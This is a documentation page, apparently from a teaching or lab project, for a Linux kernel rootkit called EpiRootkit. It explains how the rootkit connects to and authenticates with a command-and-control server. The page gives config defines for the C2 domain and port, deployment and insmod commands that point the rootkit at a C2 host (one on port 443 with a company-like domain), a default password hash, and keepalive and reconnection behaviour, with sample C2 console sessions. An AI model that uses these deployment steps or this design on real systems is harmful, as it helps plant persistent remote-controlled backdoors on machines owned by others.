---
title: "Connection & Authentication"
description: "How the rootkit connects to C2 server and authenticates"
icon: "link"
date: "2025-05-07T00:44:31+01:00"
lastmod: "2025-05-25T00:00:00+01:00"
draft: false
toc: true
weight: 503
---

# Connection & Authentication

How EpiRootkit connects to the C2 server and handles authentication with **domain support**.

## Connection Process

### Automatic Connection
When the rootkit loads, it automatically:

1. **Starts connection thread** (`epirootkit_conn`)
2. **Resolves domain** (if address is domain name) - see [DNS Resolution](./features/dns-resolution.md)
3. **Attempts TCP connection** to configured C2 server
4. **Begins keepalive system** (60-second ping/pong)
5. **Handles reconnection** with exponential backoff

### Configuration with Domain Support
```c
// rootkit/core/config.h - Domain examples
#define C2_SERVER_ADDRESS "jules-c2.example.com"  // Domain name
#define C2_SERVER_PORT 4444
#define KEEPALIVE_INTERVAL_MS 60000
#define RECONNECT_DELAY_MS 5000

// Or traditional IP
#define C2_SERVER_ADDRESS "192.168.64.1"  // IP address
#define C2_SERVER_PORT 4444
```

### Runtime Parameters
Override config.h settings during deployment:
```bash
# Deploy with domain
sudo ./deploy_rootkit.sh address=secure.company.net port=443

# Deploy with IP
sudo ./deploy_rootkit.sh address=10.0.0.100 port=8080
```

## Network Architecture

### Four-Layer System
1. **DNS Resolution** - See [DNS Resolution](./features/dns-resolution.md) for details
2. **Connection Management** (`connection.c`) - High-level coordination
3. **Keepalive System** (`keepalive.c`) - Health monitoring
4. **Socket Management** (`socket.c`) - Low-level network operations

### Connection States
- `0` = DISCONNECTED
- `1` = CONNECTED  
- `2` = CONNECTING

## Authentication System

### How It Works
1. **C2 sends command**: `auth Client-1 password`
2. **Rootkit receives**: Plain text password
3. **Rootkit hashes**: Using SHA-512 kernel crypto API
4. **Compares hash**: Against stored hash in config
5. **Returns result**: SUCCESS or ERROR

### Implementation
```c
// Default password is "password" (SHA-512 hash stored in config)
#define PASSWORD_HASH "b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86"
```

### Security Features
- **Rate limiting**: 5 attempts per 60 seconds
- **Session timeout**: 1 hour automatic expiry
- **Secure hashing**: SHA-512 using kernel crypto API

## Live Demo with Domain Support

### 1. Start C2 Server
```bash
cd attacking_program && pnpm start
```

### 2. Load Rootkit with Domain
```bash
# Deploy with domain name
sudo ./deploy_rootkit.sh address=c2.test-domain.com port=4444

# Or load directly
sudo insmod epirootkit.ko address=c2.test-domain.com port=4444
```

**C2 server shows:**
```
[2025-05-25 16:13:09] New client connected: Client-1
[2025-05-25 16:13:09] Client-1 status: UNAUTHENTICATED
```

For DNS resolution details, see [DNS Resolution](./features/dns-resolution.md).

### 3. Check Connection
```bash
c2-server$ clients
# • Client-1 - UNAUTHENTICATED - Last seen: 6:13:09 PM
```

### 4. Authenticate
```bash
c2-server$ auth Client-1 password
# ✓ [2025-05-25 16:13:29] Authenticated
# SUCCESS: Authentication successful
```

### 5. Verify Authentication
```bash
c2-server$ clients
# • Client-1 - AUTHENTICATED - Last seen: 6:13:29 PM
```

## Keepalive System

### Purpose
- **Detect disconnections**: Network failures, system crashes
- **Maintain connection**: Regular ping/pong messages
- **Trigger reconnection**: When connection lost

### How It Works
- **Ping interval**: Every 60 seconds
- **Timeout detection**: 30 seconds for response
- **Failure threshold**: 3 consecutive failed pings
- **Automatic reconnection**: Exponential backoff (5s → 10s → 20s → 40s → 60s max)

### Monitoring
```bash
# Check keepalive status from C2
c2-server$ keepalive Client-1
# Keepalive Status:
# Last ping sent: 2025-05-25 16:14:00
# Last pong received: 2025-05-25 16:14:00
# Failed ping count: 0
# Connection stable: YES
```

## Reconnection Handling

### Disconnection Detection
1. **Socket-level**: Immediate network failures
2. **Keepalive timeout**: No response to ping
3. **Send failures**: Failed command results

### Reconnection Process
1. **Detect disconnection**
2. **Wait with backoff**: 5s → 10s → 20s → 30s (max)
3. **Attempt reconnection** (with DNS resolution if domain - see [DNS Resolution](./features/dns-resolution.md))
4. **Reset authentication**: Must re-authenticate after reconnect
5. **Resume operations**

For DNS-aware reconnection details, see [DNS Resolution](./features/dns-resolution.md).
